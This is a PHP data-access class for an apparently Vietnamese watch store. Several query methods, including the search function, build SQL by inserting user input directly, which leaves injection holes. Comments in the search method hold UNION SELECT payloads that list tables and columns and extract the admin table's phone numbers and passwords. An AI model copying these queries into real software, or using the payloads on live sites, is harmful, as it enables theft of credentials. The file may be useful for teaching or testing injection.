<?php 
    class SanPhamModel extends db {
        public function GetConnect(){
            return $this->conn;
        }

        public function GetAllSp(){
            $query = "SELECT * FROM sanpham";
            return mysqli_query($this->conn,$query);
        }

        public function GetAllTypeSp(){
            $query = "SELECT distinct type FROM sanpham";
            return mysqli_query($this->conn,$query);
        }

        public function GetDongHoNam(){
            $query = "SELECT * FROM sanpham WHERE type = \"ĐỒNG HỒ NAM\" ";
            return mysqli_query($this->conn,$query);
        }

        public function GetSLDongHoNam(){
            $query = "SELECT count(id) AS SL FROM sanpham WHERE type = \"ĐỒNG HỒ NAM\" ";
            return mysqli_query($this->conn,$query);
        }

        public function GetDongHoNu(){
            $query = "SELECT * FROM sanpham WHERE type = \"ĐỒNG HỒ NỮ\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetSLDongHoNu(){
            $query = "SELECT count(id) AS SL FROM sanpham WHERE type = \"ĐỒNG HỒ NỮ\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetDongHoDoi(){
            $query = "SELECT * FROM sanpham WHERE type = \"ĐỒNG HỒ ĐÔI\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetSLDongHoDoi(){
            $query = "SELECT count(id) AS SL FROM sanpham WHERE type = \"ĐỒNG HỒ ĐÔI\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetPhuKien(){
            $query = "SELECT * FROM sanpham WHERE type = \"PHỤ KIỆN\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetSLPhuKien(){
            $query = "SELECT count(id) AS SL FROM sanpham WHERE type = \"PHỤ KIỆN\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetSpByName($select){
            $query = "SELECT * FROM sanpham WHERE name = \"$select\" ";
            return mysqli_query($this->conn,$query);
        }

        public function GetSpById($select){
            $query = "SELECT * FROM sanpham WHERE id = $select";
            return mysqli_query($this->conn,$query);
        }


        public function GetSLByBrand($brand){ 
            $query = "SELECT count(id) AS SL FROM sanpham WHERE brand = \"$brand\"";
            return mysqli_query($this->conn,$query);
        }

        public function GetBrand(){
            $query = "SELECT distinct brand FROM sanpham";
            return mysqli_query($this->conn,$query);
        }

        public function SearchSp($detail){
    

            
            // $Ma1 = "'UNION SELECT 1,TABLE_NAME from information_schema.tables#'";
            
            // $Ma2 = "'UNION SELECT 1,TABLE_NAME,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables#'";

            // $Ma3 = "'UNION SELECT 1,COLUMN_NAME,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns WHERE TABLE_NAME = 'admin'#'";

            // $Ma4 = "'UNION SELECT 0,phonenumber,passwd,2,3,4,5,6,7,8,9,10,11,12,13,14 from admin#";



            $query = "SELECT * FROM sanpham 
            WHERE brand LIKE \"%$detail%\"
              OR name LIKE \"%$detail%\"
              OR typeSearch LIKE \"%$detail%\"
              OR watch_chainSearch LIKE \"%$detail%\"
              OR glass_type LIKE \"%$detail%\"
              OR colorSearch LIKE \"%$detail%\"
              OR shapeSearch LIKE \"%$detail%\"
              OR mo_ta LIKE \"%$detail%\"
              ";
            return mysqli_query($this->conn,$query);
        }

    }

?>